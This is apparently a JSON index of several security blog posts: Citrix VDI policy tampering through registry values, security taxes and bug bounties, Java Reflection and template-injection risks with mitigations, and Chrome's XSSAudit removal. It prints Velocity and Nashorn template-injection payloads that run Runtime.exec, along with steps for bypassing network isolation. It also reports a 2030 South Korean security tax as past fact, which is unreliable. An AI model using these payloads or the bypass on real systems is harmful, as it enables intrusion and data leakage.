\u0026#34;AutoConnectDrives\u0026#34;=dword:00000001 \u0026#34;AllowCdromDrives\u0026#34;=dword:00000001 \u0026#34;AllowFixedDrives\u0026#34;=dword:00000001 \u0026#34;AllowFloppyDrives\u0026#34;=dword:00000001 \u0026#34;AllowNetworkDrives\u0026#34;=dword:00000001 \u0026#34;AllowRemoveableDrives\u0026#34;=dword:00000001 \u0026#34;UseAsyncWrites\u0026#34;=dword:00000001 \u0026#34;ReadOnlyMappedDrive\u0026#34;=dword:00000000 Upon logging back into the VDI, PicaSvc2.exe retrieves the policy settings from the Citrix server and stores them in the registry.\nWhile PicaSvc2.exe is writing and reading policies, the registry values have already been tampered with by the previously executed batch file.\nPicaSvc2.exe then applies the manipulated policies in the VDI environment.\nAdditionally:\nBy modifying the registry of the connecting PC, hardware redirection can be enabled, which allows unauthorized network access. Citrix\u0026rsquo;s default policy allows USB class FFh, which means an iPhone can be used for tethering or a USB-based wireless card could be used to bypass network isolation. To enable iPhone tethering, the attacker would need to install drivers extracted from the iTunes installer: Apple network driver and Apple USB driver. After redirecting the iPhone in the Citrix session, internet access can be obtained even in a network-isolated environment. Impact For companies using VDI to maintain logical network separation, this vulnerability could lead to the leakage of internal information and unauthorized access to internal servers.\nGiven the potential impact, it is crucial to identify and mitigate such attacks in real-time. Below are steps to discover and monitor potential bypass activities.\nDiscovery To discover this issue:\nUse Procmon to monitor the operations of PicaSvc2.exe. Examine the registry keys where the Citrix agent stores its policy settings. Manipulate and observe the effects of changes in these registry values. Design Analysis The Citrix Common Criteria Certification document includes measures to prevent unauthorized modification of configuration data. According to Citrix\u0026rsquo;s Common Criteria Certification Information, the integrity and confidentiality of the data required for setup and assignment of a virtual desktop or application are maintained during transmission between servers. This design also includes prevention measures against attackers, application users, or desktop users from modifying the configuration data.\nDespite Citrix\u0026rsquo;s implementation of security features as outlined above, legal considerations must also be addressed, particularly in regions like South Korea where strict network isolation laws apply.\nCitrix‚Äôs security objectives, including O.Secure_Setup_Data, OE.TLS, and OE.Encryption, ensure the confidentiality and integrity of the configuration data during processing and transmission between servers.\nFor more details on the security objectives and the roles of management functions, see:\nFMT_SMF.1/Authorise: Management of the endpoint data access control policy FMT_MSA.1/Desktop FMT_MSA.3/Desktop FMT_MSA.1/Application FMT_MSA.3/Application FPT_ITT.1 Legal Considerations In South Korea, the Financial Supervisory Service (FSS) has introduced measures under the Electronic Financial Transactions Act that provide companies with the option of implementing logical network separation. Financial institutions are required to block unauthorized access and prevent incidents by adopting network isolation measures to protect sensitive data from external attacks.\nSince the attack requires administrative privileges, companies should review their policy regarding the removal of administrative privileges for PC users in logically separated network environments. Furthermore, there is a need for legal improvements to include regulations that prevent the misuse of these systems.\nLimitation Even with administrative and installation privileges restricted, it is still difficult to fully prevent data leaks through methods such as capturing screen images. More detailed analysis and solutions regarding logical network isolation models can be found in this report.\nThese limitations suggest that even with administrator rights removed, organizations remain vulnerable. This highlights the importance of addressing these issues at both a technical and regulatory level, as seen in recent banking sector responses to similar incidents.\nRelated Issues Following a 2011 hacking incident at Nonghyup, several major banks in South Korea began implementing internal-external network separation to prevent the leakage, theft, or tampering of personal information. Network isolation remains a key recommendation to ensure the safety of personal data. See relevant guidelines here and information on ISMS-P certification here.\nAdditional information on Citrix Common Criteria certification can be found here and here.\n","permalink":"https://windshock.github.io/en/post/2023-04-27-bypassing-citrix-policy-is-not-a-vulnerability-but-it-can-be-a-violation-of-the-law/","summary":"\u003ch3 id=\"bypassing-citrix-policy-is-not-a-vulnerability-but-a-legal-violation\"\u003eBypassing Citrix Policy is Not a Vulnerability but a Legal Violation\u003c/h3\u003e\n\u003ch4 id=\"note\"\u003eNote!!\u003c/h4\u003e\n\u003cp\u003eBased on discussions with Citrix through \u003ca href=\"https://kb.cert.org/vince/comm/case/1022/\"\u003eVINCE\u003c/a\u003e from cert.org, it was concluded that this is not classified as a vulnerability because it requires administrative privileges. Therefore, I can share this information without security concerns. However, for security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logically isolated or closed networks. If VDI must be used in such environments, please ensure that administrator privileges are removed and security-specific software is installed.\u003c/p\u003e","title":"Bypassing citrix policy is not a vulnerability, but it can be a violation of the law"},{"content":"Ôªø Strengthening Cybersecurity Through Government NGOs and Bug Bounty Programs: A Look at Security Taxes and Their Implementation in Various Countries\nIn today\u0026rsquo;s digital age, information security has become a critical concern for individuals, businesses, and governments alike. Cyber attacks and data breaches have become increasingly common and sophisticated, and the consequences can be devastating. This is why it is essential to have robust cybersecurity measures in place to protect against these threats.\nOne approach that is gaining popularity is the use of government NGOs (non-governmental organizations) and bug bounty programs. These programs are designed to encourage individuals and organizations to identify and report vulnerabilities and weaknesses in digital systems, allowing for timely and effective remediation. They are an essential component of any comprehensive cybersecurity strategy, and their importance cannot be overstated.\nIn some countries, governments have also implemented security taxes to fund these programs. These taxes are charged on businesses that are deemed to be at high risk of cyber attacks, and the proceeds are used to establish and support government NGOs and bug bounty programs. While this approach has been met with some controversy, there is no denying its effectiveness in raising the necessary funds to protect against cyber threats.\nOne example of a country that has implemented a security tax is South Korea. In 2030, the South Korean government introduced a tax on companies that are deemed to be at high risk of cyber attacks. The tax ranges from 0.09% to 2% of the company\u0026rsquo;s annual revenue, depending on their size and level of risk. The funds collected from the tax are used to support the country\u0026rsquo;s national cybersecurity agency, as well as various government NGOs and bug bounty programs.\nThe importance of NGOs in this context cannot be overstated. NGOs are essential in bridging the gap between the government and the private sector when it comes to cybersecurity. They are better equipped to handle the technical aspects of cybersecurity and can work closely with businesses and organizations to identify vulnerabilities and weaknesses in their systems. This partnership between the government and NGOs is crucial in protecting against cyber threats.\nThe R\u0026amp;R (roles and responsibilities) of government NGOs and bug bounty programs can vary depending on the country and the specific program. In general, government NGOs are responsible for conducting research and analysis on cybersecurity threats and developing best practices and guidelines. They also work closely with businesses and organizations to provide guidance and assistance in implementing these best practices.\nBug bounty programs, on the other hand, are designed to incentivize individuals and organizations to identify and report vulnerabilities in digital systems. These programs offer rewards, often in the form of cash, to those who identify and report valid vulnerabilities. This approach has proven to be highly effective in identifying and addressing vulnerabilities before they can be exploited by cybercriminals.\nIt is important to note that these programs should not charge security taxes on individuals. The burden of funding these programs should be on businesses and organizations that are at high risk of cyber attacks.\nIn summary, security taxes, NGOs, and bug bounty programs are all important tools for strengthening cybersecurity in the face of an increasingly complex threat landscape. By working together, government agencies, NGOs, and private companies can help identify and address vulnerabilities in a timely and effective manner, thereby reducing the risk of costly and damaging cyberattacks.\n","permalink":"https://windshock.github.io/en/post/2023-04-18-strengthening-cybersecurity-through-government-ngos-and-bug-bounty-programs/","summary":"\u003cp\u003eÔªø\nStrengthening Cybersecurity Through Government NGOs and Bug Bounty Programs: A Look at Security Taxes and Their Implementation in Various Countries\u003c/p\u003e\n\u003cp\u003eIn today\u0026rsquo;s digital age, information security has become a critical concern for individuals, businesses, and governments alike. Cyber attacks and data breaches have become increasingly common and sophisticated, and the consequences can be devastating. This is why it is essential to have robust cybersecurity measures in place to protect against these threats.\u003c/p\u003e","title":"Strengthening cybersecurity through government ngos and bug bounty programs"},{"content":"Security Threats and Mitigation Strategies for Java Reflection The Java Reflection API is a powerful tool that allows dynamic manipulation of classes, methods, and interfaces at runtime. However, due to its flexibility, it introduces significant security risks, as attackers can exploit it to gain unauthorized access to systems. In this article, we will explore the security threats posed by Java Reflection and outline strategies to mitigate these risks.\nThe Risks of Using Reflection API Reflection is commonly used to inspect the structure of objects or dynamically invoke methods at runtime. However, without a proper Security Manager, sensitive methods (like execute, eval, etc.) can be accessed, leading to potential Remote Code Execution (RCE) attacks.\nFor example, the following code demonstrates the risks of using Reflection to execute system commands:\n#set($exp=\u0026#34;test\u0026#34;) $exp.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;, null) .invoke(null, null) .exec(\u0026#34;calc\u0026#34;) This code uses the Velocity template engine with Reflection to execute a system command, which can be exploited by attackers if proper security measures are not in place. However, Java 9 introduced enhanced security mechanisms to mitigate such risks.\nJava 9 and the StackWalker API In Java 9, the traditional Reflection.getCallerClass method was deprecated and replaced with the StackWalker API, which provides a more secure way to inspect the calling class. Previously, security checks were only performed on the immediate caller, but with StackWalker, the entire call stack can be examined for more comprehensive security.\nFor more details, refer to the Stack Walking API guide. This ensures that all potential vulnerabilities along the call chain are addressed, as demonstrated by the CVE-2012-4681 exploit. In this vulnerability, issues with caller-sensitive methods in Java were exploited, leading to attacks, but since Java 8, the @CallerSensitive annotation has helped safeguard such methods.\nThe Problem with Blacklist-Based Security and the Need for Whitelisting Traditional blacklist-based security approaches focus on blocking specific dangerous elements but often fail to cover all attack vectors. For instance, blacklisting certain methods or classes can easily be bypassed by attackers who find alternate methods that aren\u0026rsquo;t blocked.\nExpression Language Injection and other dynamic code execution attacks frequently exploit this limitation. As demonstrated in the Blackhat JSON Attacks, blacklist filtering methods can be bypassed, and attackers can execute malicious commands through unblocked pathways.\nFor this reason, a whitelisting approach is generally more effective. Whitelisting only allows access to explicitly trusted classes and methods, while blocking everything else by default. This significantly reduces the risk of code execution through unapproved methods or reflection-based attacks.\nThe Role and Limitations of SecureUberspector SecureUberspector in Apache Velocity is a tool that limits class loading and Reflection, especially in scenarios where untrusted or numerous template writers are involved. It prevents the execution of arbitrary objects and reflection on those objects, enhancing security. However, it has limitations.\nFor example, in CVE-2019-17558, SecureUberspector could not fully block all reflection-based attacks. Particularly, it does not prevent the use of javax.script.ScriptEngineManager, which can be exploited to execute arbitrary code. GHSL-2020-048 demonstrates how attackers can bypass SecureUberspector using this vulnerability:\n#set($engine = $scriptEngineManager.getEngineByName(\u0026#34;nashorn\u0026#34;)) #engine.eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;) This script bypasses SecureUberspector and allows remote command execution. Similarly, attackers can bypass security mechanisms using Groovy scripts, as noted in the SecureLayer7 analysis.\nApplying Whitelisting: Concrete Strategies Whitelisting is the preferred security model, allowing only trusted classes, methods, and objects while blocking all others. Below are specific methods for applying whitelisting in Java.\nUsing the Security Manager\nThe Java Security Manager can be employed to restrict access to sensitive resources and only allow specific classes or methods to be executed.\nSystem.setSecurityManager(new SecurityManager()); // Define permissions for trusted methods/classes PermissionCollection perms = new Permissions(); perms.add(new RuntimePermission(\u0026#34;accessDeclaredMembers\u0026#34;)); // Allow reflection access perms.add(new RuntimePermission(\u0026#34;createClassLoader\u0026#34;)); // Allow class loader creation AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // Execute only within whitelisted methods secureMethod(); return null; } }, new AccessControlContext(new ProtectionDomain[] {new ProtectionDomain(null, perms)})); Controlling Access with Reflection\nWhen using Reflection, you can manually restrict access to certain classes and methods, rejecting any that are not explicitly allowed.\nprivate static final Set\u0026lt;String\u0026gt; allowedMethods = Set.of( \u0026#34;java.lang.String\u0026#34;, \u0026#34;java.util.List\u0026#34; // Whitelisted classes ); public static Object invokeMethod(Method method, Object target, Object... args) throws Exception { if (!allowedMethods.contains(method.getDeclaringClass().getName())) { throw new SecurityException(\u0026#34;Unauthorized method invocation: \u0026#34; + method.getName()); } return method.invoke(target, args); // Only whitelisted methods are executed } Whitelisting in Script Engines\nScript engines such as javax.script.ScriptEngineManager can also implement whitelisting to ensure that only safe scripts or commands are executed.\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;nashorn\u0026#34;); engine.setBindings(new SimpleBindings(allowedMethods), ScriptContext.ENGINE_SCOPE); // Apply whitelisting engine.eval(\u0026#34;some safe script here\u0026#34;); Whitelisting in Template Engines\nTools like SecureUberspector can be configured to enforce a whitelisting approach by limiting access to trusted methods and objects in template engines.\npublic Iterator getIterator(Object obj, Info i) { if (obj != null) { SecureIntrospectorControl sic = (SecureIntrospectorControl) introspector; if (sic.checkObjectExecutePermission(obj.getClass(), null)) { return super.getIterator(obj, i); } else { log.warn(\u0026#34;Cannot retrieve iterator from \u0026#34; + obj.getClass() + \u0026#34; due to security restrictions.\u0026#34;); } } return null; } Protecting with StackWalker: Caller Validation Introduced in Java 9, the StackWalker API provides a secure way to inspect the call stack, offering better control over method invocations. StackWalker can be used to ensure that methods are only invoked by trusted callers.\nBelow is an example using StackWalker to validate the caller of a method:\nimport java.lang.StackWalker; import java.util.List; import java.util.Set; import java.util.stream.Collectors; public class SecurityManagerUtil { // Whitelisted caller classes private static final Set\u0026lt;String\u0026gt; allowedCallers = Set.of(\u0026#34;com.example.TrustedClass\u0026#34;); public static void checkCaller() { List\u0026lt;String\u0026gt; stackTrace = StackWalker.getInstance(StackWalker.Option.RETAIN_CLASS_REFERENCE) .walk(frames -\u0026gt; frames.map(frame -\u0026gt; frame.getDeclaringClass().getName()) .collect(Collectors.toList())); // If caller is not whitelisted, throw an exception boolean isCallerAllowed = stackTrace.stream().anyMatch(allowedCallers::contains); if (!isCallerAllowed) { throw new SecurityException(\u0026#34;Unauthorized caller detected: \u0026#34; + stackTrace); } } public static void secureMethod() { checkCaller(); // Verify caller before execution System.out.println(\u0026#34;Secure method executed.\u0026#34;); } } This example ensures that only trusted classes are allowed to invoke secureMethod(). If an unauthorized class tries to access the method, an exception is thrown.\nConclusion: Proper Use and Protection of Reflection The Java Reflection API is a flexible and powerful tool, but it introduces significant security risks, especially when combined with template engines like Velocity. Blacklist-based approaches are prone to bypasses, while whitelisting provides stronger protection by allowing only trusted elements to be executed. Furthermore, leveraging the StackWalker API enhances security by validating method invocations and blocking unauthorized access.\nBy combining whitelisting with tools like StackWalker, you can ensure that your Java applications are more secure and resilient against reflection-based attacks.\n","permalink":"https://windshock.github.io/en/post/2019-09-03-security-threats-and-mitigation-strategies-for-java-reflection/","summary":"\u003ch3 id=\"security-threats-and-mitigation-strategies-for-java-reflection\"\u003eSecurity Threats and Mitigation Strategies for Java Reflection\u003c/h3\u003e\n\u003cp\u003eThe \u003cstrong\u003eJava Reflection API\u003c/strong\u003e is a powerful tool that allows dynamic manipulation of classes, methods, and interfaces at runtime. However, due to its flexibility, it introduces significant security risks, as attackers can exploit it to gain unauthorized access to systems. In this article, we will explore the security threats posed by Java Reflection and outline strategies to mitigate these risks.\u003c/p\u003e\n\u003ch4 id=\"the-risks-of-using-reflection-api\"\u003eThe Risks of Using Reflection API\u003c/h4\u003e\n\u003cp\u003eReflection is commonly used to inspect the structure of objects or dynamically invoke methods at runtime. However, without a proper \u003cstrong\u003eSecurity Manager\u003c/strong\u003e, sensitive methods (like \u003ccode\u003eexecute\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e, etc.) can be accessed, leading to potential \u003cstrong\u003eRemote Code Execution (RCE)\u003c/strong\u003e attacks.\u003c/p\u003e","title":"Security threats and mitigation strategies for java reflection"},{"content":"Why Was the XSSAudit Feature Removed in Chrome? The Google Security Team proposed to the Chrome development team to remove the XSSAudit feature. Although the only rationale provided was that the feature could be bypassed (as argued in a paper by evn@google.com), it initially seemed unlikely that removal would proceed. However, it was ultimately decided that the feature would be completely eliminated in Chrome.\nThe main point of the paper is that bypass methods using targets within new JavaScript frameworks are difficult to defend against. Therefore, it proposes a shift from the existing mitigation approach (the xssaudit filter) to an isolation/prevention method, namely Content Security Policy (CSP).\nWasn\u0026rsquo;t XSSAudit Useful? From the perspective of companies like Google, if the XSSAudit feature incurs maintenance costs and results in poorer performance compared to competitors‚Äô browsers (e.g., Microsoft‚Äôs), it is only natural to want to remove it. (In fact, this feature was already removed in MS EDGE.)\nFor ethical hackers and attackers, bypassing XSSAudit is only possible under very unusual circumstances, making the feature a particularly annoying and troublesome obstacle.\nFor security professionals and defenders, implementing the challenging CSP adds significant workload. Moreover, CSP is not a perfect defense mechanism. The Content Security Policy Level 2 RFP also describes CSP as one way to enhance defenses:\nContent Security Policy (CSP) is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth, to reduce the harm caused by content injection attacks. As a first line of defense against content injection, server operators should validate their input and encode their output.\nApart from browser developers like Google, the XSSAudit feature was useful to nearly everyone. If the only reason for its removal is that it can be bypassed, it seems like a decision driven by corporate interests. Wasn\u0026rsquo;t Google supposed to follow the motto ‚ÄúDon\u0026rsquo;t be evil, do the right thing‚Äù?\nRegardless, We Now Must Study CSP Implementation Intensively :( How do I Content Security Policy\nSo we broke all CSPs ‚Ä¶\n","permalink":"https://windshock.github.io/en/post/2019-08-08-about-the-xssaudit/","summary":"\u003ch2 id=\"why-was-the-xssaudit-feature-removed-in-chrome\"\u003eWhy Was the XSSAudit Feature Removed in Chrome?\u003c/h2\u003e\n\u003cp\u003eThe Google Security Team proposed to the Chrome development team to remove the \u003ca href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=898081\"\u003eXSSAudit feature\u003c/a\u003e. Although the only rationale provided was that the feature could be bypassed (as argued in a paper by \u003ca href=\"mailto:evn@google.com\"\u003eevn@google.com\u003c/a\u003e), it initially seemed unlikely that removal would proceed. However, it was ultimately decided that the feature would be completely eliminated in Chrome.\u003c/p\u003e\n\u003cp\u003eThe main point of the \u003ca href=\"/pdf/p1709-lekiesA.pdf\"\u003epaper\u003c/a\u003e is that bypass methods using targets within new JavaScript frameworks are difficult to defend against. Therefore, it proposes a shift from the existing mitigation approach (the xssaudit filter) to an isolation/prevention method, namely Content Security Policy (CSP).\u003c/p\u003e","title":"About the XSSAudit"},{"content":"üöÄ Security Vulnerability Analyst and Security Automation Expert üöÄ\nWith over 17 years of experience, I focus on vulnerability analysis, secure coding, and building automated security solutions. My work revolves around providing coded security solutions that help organizations address security challenges faster and more effectively. By following key security principles, I emphasize a shift-left approach to integrate security earlier in the development process, while leveraging data-driven security to build smarter systems.\nüîë Shift Left - Secure Coding Guidelines for Developers and Stakeholders: Security should be integrated early in the development process. To achieve this, I provide secure coding guidelines targeted at developers and business stakeholders, offering immediate support for addressing vulnerabilities. These guidelines help strengthen security from the initial stages of development, promoting a shift-left approach to security.\nüîë Security Automation - Building Automated Security Solutions: Security automation is critical in today‚Äôs development environments. I have established automated security solutions within DevSecOps environments, seamlessly integrating security into development pipelines. Through automated malware detection and security log analysis, I have significantly reduced manual efforts and minimized response times to security threats.\nüîë Data-Driven Security - Fortify Vulnerability Clustering and Anomalous Traffic Analysis: I focus on data-driven security and have developed tools using Fortify for vulnerability clustering and analyzing anomalous traffic. These tools allow for faster, more systematic analysis and response to security vulnerabilities, ensuring proactive prevention of security issues across various environments.\nüîë Talent Donation - CVE, CWE Reporting and GitHub Tool Sharing: I actively contribute to the security community by reporting CVE and CWE vulnerabilities. I also develop and share tools on GitHub to help others address these vulnerabilities. This talent donation strengthens the global security ecosystem and supports organizations in resolving critical security challenges.\nI am dedicated to coding solutions for discovered vulnerabilities and sharing these tools to help organizations implement effective security measures. By promoting shift-left security, security automation, and data-driven analysis, I continue to drive security innovation. Let‚Äôs connect and explore ways to enhance security together!\nüìß Email: windshock@gmail.com\nüîó Website: https://windshock.github.io/\nüíº LinkedIn: https://www.linkedin.com/in/windshock/\n","permalink":"https://windshock.github.io/en/about/","summary":"Learn more about my professional background and expertise.","title":"About"}]